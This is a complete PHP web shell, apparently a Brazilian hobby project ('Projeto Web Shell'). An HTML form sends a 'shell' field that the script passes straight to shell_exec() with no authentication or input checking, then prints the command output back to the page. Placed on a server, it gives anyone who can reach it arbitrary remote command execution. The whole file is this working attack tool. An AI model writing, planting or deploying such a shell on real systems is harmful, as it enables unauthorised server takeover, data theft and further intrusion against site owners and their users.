<html>
    <head>
<meta charset="utf-8" />
<title>Web Shell</title>
    </head>
    <style>
        body{
            font-family: Consolas;
        background-image: url("https://assets.papodehomem.com.br/2015/09/08/01/38/12/811a3486-814e-445a-96b7-6c0443383124/file");
        background-color: #cccccc;
        }

        #IDshell{
            background-color: black;
            padding: 10px;
            border-radius: 10px;
            border-style: outset;
        }

        input{
            font-family: Consolas;
            background-color: black;
            color: green;
            border-radius: 10px;
            
        }

        button{
            font-family: Consolas;
            background-color: black;
            color: green;
            border-radius: 10px;
            border-style: inset;
            box-shadow: 0 12px 16px 0 rgba(0,0,0,0.24), 0 17px 50px 0 rgba(0,0,0,0.19);
        }

        </style>

        
    <body>

    <form method="post">

        <div id='IDshell' align=center>
        
            
            <label>SHELL: </label>
            <input size='100' name='shell' type='text'>
            <button>Enviar</button>
        </div>

    </form>
    </body>
    </html>

<?php

header('Content-Type: text/html; charset=utf-8');
$web = $_POST['shell'];
$shell = shell_exec($web);

echo "
<meta charset='UTF-8'>

<style>

div{
    background-color: black;
    color: green;
    border-radius: 10px;
    border-style: inset;
    padding: 55px;
    font-size: 14px;
}

label{
    color: green;
}

#wlcm{
    font-size: 30px;
    padding: 1px;
    hight: 10px;
    
}

#result{
    color: red;
}
</style>

<div id='wlcm'>
<pre  align=center> --- | BEM VINDO AO PROJETO WEB SHELL | --- </pre>
</div>
<br>

<div id='result'>
<pre><h2>Resultado:</h2>$shell</pre>

</div>
";

?>